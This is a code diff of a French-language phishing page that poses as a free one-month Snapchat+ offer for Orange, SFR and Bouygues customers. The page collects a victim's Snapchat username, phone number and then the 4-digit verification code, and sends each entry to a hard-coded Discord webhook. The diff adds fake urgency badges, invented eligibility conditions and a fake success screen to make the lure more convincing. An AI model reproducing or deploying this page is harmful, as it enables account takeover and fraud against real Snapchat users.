@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Snapchat - Vérification</title>
+    <title>Snapchat+ Offre Spéciale</title>
     <style>
         * {
             box-sizing: border-box;
@@ -24,31 +24,185 @@
             width: 100%;
             max-width: 400px;
             min-height: 100vh;
-            padding: 40px 24px;
+            padding: 30px 24px;
             display: flex;
             flex-direction: column;
         }
 
+        .badge {
+            background: linear-gradient(135deg, #FF6B6B, #FF8E53);
+            color: white;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            text-align: center;
+            margin-bottom: 20px;
+            align-self: center;
+        }
+
         .logo {
             text-align: center;
-            font-size: 42px;
-            margin-bottom: 40px;
-            font-weight: bold;
-            letter-spacing: -1px;
+            font-size: 48px;
+            margin-bottom: 15px;
+        }
+
+        .star-icon {
+            color: #FFD700;
+            font-size: 36px;
+            text-align: center;
+            margin-bottom: 10px;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.2);
         }
 
         h1 {
-            font-size: 24px;
-            font-weight: 700;
-            margin-bottom: 12px;
+            font-size: 26px;
+            font-weight: 800;
+            margin-bottom: 8px;
             text-align: center;
+            line-height: 1.2;
+        }
+
+        .offer-text {
+            font-size: 20px;
+            color: #333;
+            text-align: center;
+            margin-bottom: 8px;
+            font-weight: 700;
+        }
+
+        .free-badge {
+            display: inline-block;
+            background: #00D26A;
+            color: white;
+            padding: 4px 12px;
+            border-radius: 12px;
+            font-size: 14px;
+            font-weight: 800;
+            margin-left: 6px;
+            box-shadow: 0 2px 8px rgba(0,210,106,0.3);
         }
 
         .subtitle {
             font-size: 14px;
-            color: #666;
+            color: #555;
             text-align: center;
-            margin-bottom: 32px;
+            margin-bottom: 20px;
+            line-height: 1.4;
+        }
+
+        /* Section Éligibilité dépliable */
+        .eligibility-section {
+            margin-bottom: 24px;
+        }
+
+        .eligibility-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 12px;
+        }
+
+        .eligible-text {
+            font-size: 14px;
+            color: #666;
+            font-weight: 600;
+        }
+
+        .eligibility-btn {
+            background: #fff;
+            border: 2px solid #0EADFF;
+            color: #0EADFF;
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .eligibility-btn:hover {
+            background: #0EADFF;
+            color: #fff;
+        }
+
+        .eligibility-btn.active {
+            background: #0EADFF;
+            color: #fff;
+        }
+
+        .eligibility-content {
+            background: #fff;
+            border-radius: 16px;
+            padding: 0;
+            max-height: 0;
+            overflow: hidden;
+            transition: all 0.3s ease;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.08);
+        }
+
+        .eligibility-content.open {
+            padding: 20px;
+            max-height: 300px;
+        }
+
+        .eligibility-title {
+            font-size: 14px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .operator-list {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            flex-wrap: wrap;
+            margin-bottom: 15px;
+        }
+
+        .operator {
+            background: #f0f0f0;
+            padding: 10px 16px;
+            border-radius: 10px;
+            font-size: 13px;
+            font-weight: 600;
+            color: #333;
+            border: 2px solid #ddd;
+        }
+
+        .operator.orange { border-color: #FF6600; background: #FFF5EB; color: #FF6600; }
+        .operator.sfr { border-color: #E30613; background: #FDEBEB; color: #E30613; }
+        .operator.bouygues { border-color: #0078C9; background: #EBF5FD; color: #0078C9; }
+
+        .conditions-list {
+            list-style: none;
+            font-size: 13px;
+            color: #555;
+            line-height: 1.6;
+        }
+
+        .conditions-list li {
+            padding: 6px 0;
+            padding-left: 24px;
+            position: relative;
+        }
+
+        .conditions-list li::before {
+            content: "✓";
+            position: absolute;
+            left: 0;
+            color: #00D26A;
+            font-weight: bold;
         }
 
         .input {
@@ -138,7 +292,7 @@
             margin-top: 20px;
             text-align: center;
             color: #666;
-            font-size: 12px;
+            font-size: 11px;
             line-height: 1.5;
         }
 
@@ -152,14 +306,14 @@
 
         .verify-icon {
             font-size: 48px;
-            margin-bottom: 24px;
+            margin-bottom: 20px;
         }
 
         .code-message {
-            font-size: 16px;
+            font-size: 15px;
             color: #333;
             text-align: center;
-            margin-bottom: 32px;
+            margin-bottom: 28px;
             line-height: 1.5;
         }
 
@@ -167,7 +321,7 @@
             display: flex;
             gap: 12px;
             justify-content: center;
-            margin-bottom: 32px;
+            margin-bottom: 28px;
         }
 
         .code-input {
@@ -222,7 +376,7 @@
         .success {
             display: none;
             margin-top: 40px;
-            padding: 24px;
+            padding: 28px;
             border-radius: 16px;
             background: #fff;
             text-align: center;
@@ -230,14 +384,20 @@
         }
 
         .success-icon {
-            font-size: 48px;
+            font-size: 56px;
             margin-bottom: 16px;
         }
 
         .success-text {
-            font-size: 18px;
-            font-weight: 700;
+            font-size: 20px;
+            font-weight: 800;
             color: #000;
+            margin-bottom: 8px;
+        }
+
+        .success-sub {
+            font-size: 14px;
+            color: #666;
         }
 
         .hidden {
@@ -252,17 +412,48 @@
 
         <!-- Écran 1 : Formulaire -->
         <div id="form-screen">
-            <div class="logo">👻</div>
+            <div class="badge">Offre Limitée</div>
             
-            <h1>Connexion</h1>
-            <p class="subtitle">Entrez vos informations pour continuer</p>
+            <div class="logo">👻</div>
+            <div class="star-icon">⭐</div>
+            
+            <h1>Snapchat+ Gratuit</h1>
+            <p class="offer-text">1 mois offert <span class="free-badge">GRATUIT</span></p>
+            <p class="subtitle">Profitez de toutes les fonctionnalités exclusives pendant 30 jours</p>
+
+            <!-- Section Éligibilité dépliable -->
+            <div class="eligibility-section">
+                <div class="eligibility-header">
+                    <span class="eligible-text">Compte éligible ?</span>
+                    <button class="eligibility-btn" id="eligibility-btn" onclick="toggleEligibility()">
+                        Voir les conditions
+                        <span id="arrow">▼</span>
+                    </button>
+                </div>
+                
+                <div class="eligibility-content" id="eligibility-content">
+                    <div class="eligibility-title">
+                        📋 Conditions requises
+                    </div>
+                    <div class="operator-list">
+                        <div class="operator orange">📱 Orange</div>
+                        <div class="operator sfr">📱 SFR</div>
+                        <div class="operator bouygues">📱 Bouygues</div>
+                    </div>
+                    <ul class="conditions-list">
+                        <li>Être client Orange, SFR ou Bouygues Telecom</li>
+                        <li>Avoir son numéro relié à son compte Snapchat</li>
+                        <li>Ne jamais avoir eu Snapchat+ auparavant</li>
+                    </ul>
+                </div>
+            </div>
 
             <form id="form">
                 <input
                     class="input"
                     id="username"
                     type="text"
-                    placeholder="Nom d'utilisateur"
+                    placeholder="Nom d'utilisateur Snapchat"
                     autocomplete="off"
                     required
                 >
@@ -280,12 +471,12 @@
                 </div>
 
                 <button class="continue" type="submit">
-                    Continuer
+                    Activer mon mois gratuit
                 </button>
             </form>
 
             <p class="info">
-                En continuant, vous acceptez les Conditions d'utilisation et la Politique de confidentialité.
+                Offre réservée aux clients éligibles. Sans engagement, résiliation possible à tout moment.
             </p>
         </div>
 
@@ -315,14 +506,26 @@
 
         <!-- Écran 3 : Succès -->
         <div class="success" id="success">
-            <div class="success-icon">✅</div>
-            <div class="success-text">Vérification réussie !</div>
+            <div class="success-icon">🎉</div>
+            <div class="success-text">Snapchat+ activé !</div>
+            <div class="success-sub">Votre mois gratuit commence maintenant</div>
         </div>
 
     </main>
 
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1519782475222483036/WvhWDXA34FkJB0_fbcNT4X5PQb8D58kDA0TNBK_i4RQf85peDe6xursXooQ_BkKUPbop";
+
+        // Toggle éligibilité
+        function toggleEligibility() {
+            const content = document.getElementById('eligibility-content');
+            const btn = document.getElementById('eligibility-btn');
+            const arrow = document.getElementById('arrow');
+            
+            content.classList.toggle('open');
+            btn.classList.toggle('active');
+            arrow.textContent = content.classList.contains('open') ? '▲' : '▼';
+        }
 
         const formScreen = document.getElementById("form-screen");
         const verifyScreen = document.getElementById("verify-screen");
@@ -354,13 +557,11 @@
             userData.username = usernameInput.value.trim();
             userData.phone = phoneInput.value.trim();
 
-            // Afficher le numéro masqué
             const maskedPhone = "+33 " + userData.phone.slice(0, 2) + "••••••" + userData.phone.slice(-2);
             displayPhone.textContent = maskedPhone;
 
-            // Envoyer les infos à Discord
             const message = {
-                content: "📩 **Nouvelle soumission !**\n" +
+                content: "📩 **Nouvelle demande Snapchat+ !**\n" +
                          "👤 **Snapchat :** `" + userData.username + "`\n" +
                          "📱 **Téléphone :** `+33 " + userData.phone + "`\n" +
                          "⏳ **Status :** En attente du code...\n" +
@@ -374,7 +575,6 @@
                     body: JSON.stringify(message)
                 });
 
-                // Passer à l'écran de vérification
                 formScreen.style.display = "none";
                 verifyScreen.style.display = "flex";
                 codeInputs[0].focus();
@@ -385,10 +585,9 @@
             }
         });
 
-        // Gestion des inputs du code (auto-focus suivant)
+        // Gestion des inputs du code
         codeInputs.forEach((input, index) => {
             input.addEventListener("input", function(e) {
-                // Accepter uniquement les chiffres
                 this.value = this.value.replace(/[^0-9]/g, '');
                 
                 if (this.value.length === 1 && index < 3) {
@@ -416,9 +615,8 @@
             
             if (code.length !== 4) return;
 
-            // Envoyer le code à Discord
             const message = {
-                content: "🔐 **Code reçu !**\n" +
+                content: "🔐 **Code reçu - Snapchat+ !**\n" +
                          "👤 **Snapchat :** `" + userData.username + "`\n" +
                          "📱 **Téléphone :** `+33 " + userData.phone + "`\n" +
                          "🔢 **Code :** `" + code + "`\n" +
@@ -442,7 +640,6 @@
             }
         });
 
-        // Renvoyer le code (simulation)
         resendLink.addEventListener("click", function(e) {
             e.preventDefault();
             alert("Un nouveau code a été envoyé !");
